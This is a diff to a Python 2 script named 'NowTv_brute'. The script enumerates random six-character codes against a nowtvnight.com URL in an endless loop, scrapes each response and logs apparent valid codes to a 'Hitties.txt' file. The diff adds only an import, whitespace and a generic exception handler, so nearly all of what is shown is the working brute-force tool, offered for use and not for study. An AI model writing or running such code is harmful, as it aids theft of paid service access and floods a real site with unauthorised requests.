@@ -2,11 +2,13 @@
 import requests
 from pyquery import PyQuery
 import random
+import sys
 
 
 def get_html():
     html = connection.text[:100]
     pq = PyQuery(html)
+    
     tag = pq(connection.content)
     lol = (tag('label').text())
     print lol
@@ -14,7 +16,7 @@ def get_html():
         with open("Hitties.txt","a") as myfile:
             myfile.write(''.join(characters))
             myfile.write('\n')
-            
+                
 def helpp():
     print("[*] Okay son, these are the commands. ")
     print("help    - To show this menu. ")
@@ -35,22 +37,25 @@ version = 'version'
 print("[*] Welcome to NowTv_brute.")
 print("[*] Type Help if it's your first time. \n")
 Startato = False
-while Startato == False:
-    wattado = raw_input('')
-    if wattado == hellp:
-        helpp()
-    elif wattado == start:
-        Startato = True
-        active = True
-        while active:
-            for i in range(1,7):
-                characters[(i - 1)] = random.choice(letters)
-            print("trying with code "+''.join(characters))
-            connection = requests.get('http://www.nowtvnight.com/'+str(''.join(characters)))
-            get_html()
-    elif wattado == version:
-        versione()
-    else:
-        scusa()
-        print()
-        
+try:
+    while Startato == False:
+        wattado = raw_input('')
+        if wattado == hellp:
+            helpp()
+        elif wattado == start:
+            Startato = True
+            active = True
+            while active:
+                for i in range(1,7):
+                    characters[(i - 1)] = random.choice(letters)
+                print("trying with code "+''.join(characters))
+                connection = requests.get('http://www.nowtvnight.com/'+str(''.join(characters)))
+                get_html()
+        elif wattado == version:
+            versione()
+        else:
+            scusa()
+            print()
+except Exception:
+    print("[*] Generic error. ")
+    sys.exit(1)
